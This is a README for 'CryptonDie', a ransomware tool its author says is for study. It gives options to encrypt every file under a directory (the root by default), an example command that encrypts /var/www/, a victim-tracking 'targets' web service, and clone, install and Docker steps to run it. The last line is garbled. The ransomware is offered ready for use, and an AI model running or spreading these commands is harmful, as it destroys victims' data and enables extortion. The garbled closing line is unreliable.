# CryptonDie

<p align="center">
  <h3 align="center">CryptonDie</h3>
  <p align="center">CryptonDie is a ransomware developed for study purposes.</p>

  </p>
</p>

<hr>

### Options

```text
    --key       key used to encrypt and decrypt files, default is random string(recommended)
    --dir       Home directory for the attack, default is /
    --encrypt   Encrypt all files
    --decrypt   Decrypt all files
    --verbose   Active verbose mode, default is False

Example:
    python3 cryptondie.py --web-service http://127.0.0.1:5000 --dir /var/www/ --encrypt --verbose

```

### Web service endpoints

```
GET   - /targets              - list all targets (returns in JSON format)
GET   - /targets/<target_id>  - list one target by id (returns in JSON format)
POST  - /target/<target_id>   - create new target
```

<hr>

## how to run?

### Clonning repository

```
git clone https://github.com/alex14324/cryptondie
```

### Install requirements

```
pip3 install -r requirements.txt
```

### Running web service

```
cd cryptondie/discovery
python3 service_discovery.py
```

### Running in Docker

```bash
docker build -t cryptondie .
docker run -it cryptondie /bin/bash
python cryptondie.py --web-service http://127.0.0.1:5000 --dir /var/www/ --encrypt --verbose
```

### which encryption is implemented?

```text
Advanced Encryption Standard
```

### Contact

```text
[+] Telegram:   @alex14324
[+] Github:     https://github.com/alex14324
[+] Twitter:    https://twitter.com/alex14324
```

<p align="center">
  <p align="center">choose is order yet decrypted.</p>
</p>
